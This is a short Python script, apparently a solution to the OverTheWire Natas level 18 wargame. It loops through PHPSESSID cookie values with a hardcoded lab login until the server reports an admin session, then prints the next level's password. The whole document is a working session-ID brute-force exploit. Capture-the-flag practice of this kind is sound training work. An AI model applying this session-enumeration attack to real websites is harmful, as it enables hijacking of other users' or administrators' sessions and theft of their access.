
import requests

auth = ('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')

for i in range(1, 640):
    s = requests.Session()
    s.auth = auth
    req = s.get("http://natas18.natas.labs.overthewire.org/index.php",
                cookies={"admin": "1", "PHPSESSID": f"{i}"})
    print(i)
    if "You are an admin." in req.text:
        results = req.text.split()
        print(results[results.index("Password:") + 1])
        break
